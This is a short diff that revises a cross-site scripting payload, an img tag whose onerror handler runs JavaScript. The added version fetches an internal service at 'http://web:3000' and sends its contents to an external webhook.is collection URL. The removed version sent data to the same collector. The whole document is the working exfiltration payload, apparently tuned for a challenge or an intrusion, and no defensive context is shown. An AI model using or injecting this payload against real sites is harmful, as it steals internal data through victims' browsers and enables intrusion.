@@ -1,2 +1,5 @@
-<img src=x onerror="await fetch('https://jsonplaceholder.typicode.com/posts/1', { mode: 'no-cors' })
-.then(r=>fetch('https://webhook.is/test/callback/1f1cf3cdf4a0686a8062067f2def955d/?c=ok' + r.text())).catch(e=>fetch('https://webhook.is/test/callback/1f1cf3cdf4a0686a8062067f2def955d/?c=err_'+e.message))">
+<img src=x onerror="(async () => {
+  const r = await fetch('http://web:3000');
+  const t = await r.text();  
+  fetch('https://webhook.is/test/callback/1f1cf3cdf4a0686a8062067f2def955d/?c=' + encodeURIComponent(t));
+})();">
